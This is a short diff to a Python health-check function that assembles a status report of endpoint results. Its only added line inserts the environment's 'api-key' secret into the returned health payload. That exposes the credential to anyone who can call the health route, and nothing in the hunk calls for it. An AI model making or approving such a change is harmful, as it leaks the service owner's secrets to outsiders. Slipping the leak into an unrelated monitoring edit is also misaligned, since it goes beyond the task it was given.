@@ -311,6 +311,7 @@ async def _run_filtered_health() -> Dict[str, Any]:
         "base_url_used": base,
         "summary": {"total": len(results), "up": up, "down": down, "skipped": skipped},
         "results": [asdict(r) for r in results],
+        "env": os.getenv("api-key"),
     }
 
 # ========== ROUTE ==========
